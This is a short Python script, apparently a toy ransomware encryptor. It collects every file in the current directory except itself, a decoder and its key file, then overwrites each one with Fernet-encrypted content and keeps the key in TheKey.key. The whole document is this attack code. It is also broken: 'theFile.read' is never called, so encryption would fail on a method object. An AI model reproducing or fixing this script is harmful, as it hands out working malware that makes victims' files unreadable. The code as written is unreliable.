import os
from cryptography.fernet import Fernet

files = []
#this goes through the current directory and puts the files on a list
for file in os.listdir():
    if file == "decoder.py" or file == "encoder.py" or file == ".git" or file =="TheKey.key":
        continue
    #without this directories will also be added, and we also want files.
    if(os.path.isfile(file)):
        files.append(file)
print(files)

key = Fernet.generate_key()
#generate a key with fernet and store it in a file named "TheKey.key" AND ignore it in the previous for loop
with open("TheKey.key", "wb") as thekey:
    thekey.write(key)


for file in files:
    with open(file, 'rb') as theFile:
        contentOfFiles = theFile.read
    #Encrypt data
    encryptedContent = Fernet(key).encrypt(contentOfFiles)

    with open(file, "wb") as theFile:
        theFile.write(encryptedContent)